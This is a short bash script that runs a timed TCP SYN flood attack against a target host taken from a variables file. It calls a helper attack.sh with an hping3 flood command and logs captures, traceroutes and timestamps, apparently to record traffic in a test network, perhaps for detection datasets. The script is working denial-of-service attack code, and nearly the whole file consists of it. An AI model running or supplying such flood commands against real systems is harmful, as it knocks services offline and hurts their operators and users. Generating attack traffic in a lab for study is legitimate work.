#!/bin/bash

#Import variables from file
source variables.sh

#Define variables for whole attack
attack_procedure_log="attack_procedure.txt"

#Define variables for attack 1
attack_type="TCP SYN Flood"
capture_file="attack1.pcap"
traceroute_log="attack1_traceroute.txt"
attack_stats_log="attack1_stats.txt"
attack_log="attack1.txt"
attack_duration=6*60 # in seconds
destination_ip=$machine11_ip
destination_port=$machine11_port
attack_script="hping3 --flood --frag -p $destination_port -S $destination_ip"


#Write to file
echo "Started $attack_type attack" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log

./attack.sh $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port $attack_script

#Write to file
echo "$attack_type attack is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log

sleep 5*60